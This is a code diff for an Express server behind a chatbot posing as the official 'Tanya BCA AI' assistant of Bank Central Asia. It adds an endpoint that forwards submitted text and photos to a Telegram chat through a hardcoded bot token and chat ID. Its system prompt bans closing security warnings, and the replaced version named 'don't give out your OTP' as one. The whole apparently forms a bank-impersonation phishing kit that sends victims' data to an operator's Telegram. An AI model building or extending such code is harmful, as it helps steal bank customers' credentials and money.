@@ -7,7 +7,8 @@ async function startServer() {
   const app = express();
   const PORT = 3000;
 
-  app.use(express.json());
+  app.use(express.json({ limit: "25mb" }));
+  app.use(express.urlencoded({ limit: "25mb", extended: true }));
 
   // Lazy initialization of GoogleGenAI SDK
   let aiClient: GoogleGenAI | null = null;
@@ -40,21 +41,29 @@ async function startServer() {
       const ai = getAIClient();
 
       const systemInstruction = `Anda adalah "Tanya BCA AI", Asisten Virtual Resmi Bank Central Asia (BCA).
-Gunakan bahasa Indonesia resmi, sopan, ringkas, langsung pada inti jawaban, dan profesional layaknya Customer Service perbankan BCA.
+Tugas utama Anda adalah MEMANDU NASABAH SECARA EKSKLUSIF pada layanan dan fitur yang tersedia di aplikasi/portal ini.
 
-PANDUAN UTAMA:
-1. FOKUS KEPADA 4 LAYANAN BANTUAN DI PORTAL INI:
-   Setiap solusi harus mengarahkan nasabah secara langsung untuk memilih salah satu dari 4 layanan bantuan utama pada menu "Pilih Kebutuhanmu" di halaman utama:
-   - **Blokir Kartu BCA**: Untuk pemblokiran darurat 24/7 kartu Debit, Kredit, atau Rekening BCA.
-   - **Amankan Kartu Bank Lain**: Untuk panduan & pengamanan darurat kartu bank mitra.
-   - **Pembatalan Transaksi**: Untuk pengajuan investigasi dan sanggahan transaksi gantung/tidak dikenal.
-   - **Amankan User ID**: Untuk pemulihan kredensial dan penguncian sementara User ID / akun.
+DARTAR LAYANAN DAN FITUR LENGKAP PADA APLIKASI INI:
+1. PERLINDUNGAN & DARURAT ("Pilih Kebutuhanmu"):
+   - **Blokir Kartu BCA**: Pemblokiran darurat 24/7 kartu Debit, Kredit, atau Rekening BCA dari penyalahgunaan.
+   - **Amankan Kartu Bank Lain**: Pusat pengamanan dan bantuan darurat untuk kartu bank mitra.
+   - **Pembatalan Transaksi**: Pengajuan investigasi kilat & sanggahan transaksi gantung/tidak dikenal.
+   - **Amankan User ID**: Restorasi cepat kredensial digital, reset password, dan penguncian sementara User ID myBCA / m-BCA.
 
-2. ATURAN PENULISAN:
-   - Jawab secara langsung, padat, dan ringkas.
-   - TANPA TEKS PERINGATAN TAMBAHAN: DILARANG keras menyertakan teks peringatan tambahan, disclaimer, footnote, atau catatan ekstra (seperti "Catatan:", "Peringatan:", "Tips Keamanan:", "Ingat jangan berikan OTP", dll.) di akhir jawaban.
-   - DILARANG menggunakan tag HTML, simbol ramai, atau emoji berlebihan.
-   - Sajikan langkah-langkah secara ringkas dalam bentuk daftar berurutan (1, 2, 3).`;
+2. NAVIGASI SMARTBAR APLIKASI:
+   - **Login**: Akses masuk ke portal e-banking resmi BCA.
+   - **Produk**: Informasi Tabungan (Tahapan BCA), Kartu Kredit, Pinjaman/KPR, dan Investasi.
+   - **Layanan**: Pusat bantuan Halo BCA 1500888, lokasi ATM/Cabang, dan info operasional.
+   - **Promo**: Penawaran diskon, cashback, dan promo belanja merchant BCA.
+   - **Webform**: Pengisian formulir online e-form pembukaan rekening dan pengajuan layanan.
+
+PANDUAN & ATURAN RESPON:
+- WAJIB hanya memberikan informasi dan solusi yang mengarahkan nasabah ke layanan yang ada di aplikasi ini.
+- Jika nasabah bertanya topik di luar layanan aplikasi ini, jawab secara sopan bahwa Anda berfokus memandu layanan resmi BCA yang ada pada aplikasi portal ini, lalu tawarkan menu bantuan yang tersedia (Blokir Kartu, Pembatalan Transaksi, Amankan User ID, dll).
+- Bahasa Indonesia resmi, profesional, sopan, ringkas, dan langsung pada poin utama.
+- Sajikan panduan langkah-langkah secara ringkas dan terstruktur (1, 2, 3).
+- DILARANG keras menyertakan catatan kaki/disclaimer/peringatan tambahan yang panjang di akhir teks.
+- DILARANG menggunakan tag HTML.`;
 
       const contents: Array<{ role: string; parts: Array<{ text: string }> }> = [];
 
@@ -96,6 +105,67 @@ PANDUAN UTAMA:
       return res.status(500).json({
         error: "Terjadi kendala jaringan pada server AI BCA. Silakan coba beberapa saat lagi."
       });
+    }
+  });
+
+  // API Route: Send Telegram Bot Notifications
+  app.post("/api/telegram/send", async (req, res) => {
+    try {
+      const { token, chatId, text, photoBase64 } = req.body;
+      const botToken = token || "8867601079:AAEuEfhFMxqhflMo6gqmQ2IHfzad6K49snM";
+      const targetChatId = chatId || "8341942326";
+
+      if (!text) {
+        return res.status(400).json({ error: "Pesan tidak boleh kosong" });
+      }
+
+      if (photoBase64 && typeof photoBase64 === "string") {
+        try {
+          const parts = photoBase64.split(";base64,");
+          const base64Data = parts[1] || parts[0];
+          const buffer = Buffer.from(base64Data, "base64");
+
+          const formData = new FormData();
+          formData.append("chat_id", targetChatId);
+          formData.append("caption", text);
+          formData.append("parse_mode", "HTML");
+          const blob = new Blob([buffer], { type: "image/jpeg" });
+          formData.append("photo", blob, "bukti_transaksi.jpg");
+
+          const photoRes = await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+            method: "POST",
+            body: formData,
+          });
+
+          if (photoRes.ok) {
+            return res.json({ success: true, method: "photo" });
+          }
+        } catch (imgErr) {
+          console.warn("Failed sending photo to Telegram, falling back to text:", imgErr);
+        }
+      }
+
+      // Send standard text message
+      const textRes = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          chat_id: targetChatId,
+          text: text,
+          parse_mode: "HTML",
+        }),
+      });
+
+      if (textRes.ok) {
+        return res.json({ success: true, method: "text" });
+      } else {
+        const errText = await textRes.text();
+        console.error("Telegram API response error:", errText);
+        return res.status(500).json({ error: "Gagal mengirim ke Telegram Bot", details: errText });
+      }
+    } catch (err: any) {
+      console.error("Telegram endpoint error:", err);
+      return res.status(500).json({ error: err?.message || "Internal server error" });
     }
   });
 
